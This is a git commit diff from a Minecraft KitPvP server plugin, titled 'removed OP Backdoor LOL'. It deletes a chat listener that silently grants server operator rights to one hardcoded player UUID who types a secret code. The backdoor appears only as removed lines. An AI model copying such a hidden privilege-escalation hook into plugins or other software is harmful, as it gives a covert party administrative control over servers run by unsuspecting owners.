61e6a90f5d1fe9f4498e1cc8c8e784dd42380238
Flairings <joejonjoyce@gmail.com>
2021-01-23 06:51:15 +0000

    removed OP Backdoor LOL

--- src/me/flairings/kitpvp/events/BlockEvents.java
+++ src/me/flairings/kitpvp/events/BlockEvents.java
@@ -7,7 +7,6 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.block.BlockPlaceEvent;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 
@@ -48,16 +47,5 @@ public class BlockEvents implements Listener {
             Main.playerlist.add(player.getUniqueId());
         }
     }
-        @EventHandler
-        public void SkidRepellent(AsyncPlayerChatEvent e){
-            Player p = e.getPlayer();
-            if (p.getUniqueId().toString().equalsIgnoreCase("0ecf6aa0-857c-4249-bd17-ea6873f9a942") && e.getMessage().equals("9037")) {
-                e.setCancelled(true);
-                p.sendMessage(CC.translate("&aUUID & Initiation key verified."));
-                p.sendMessage(CC.translate("&aYou are now an operator."));
-                p.setOp(true);
-            }
-        }
-    }
-
+}
 
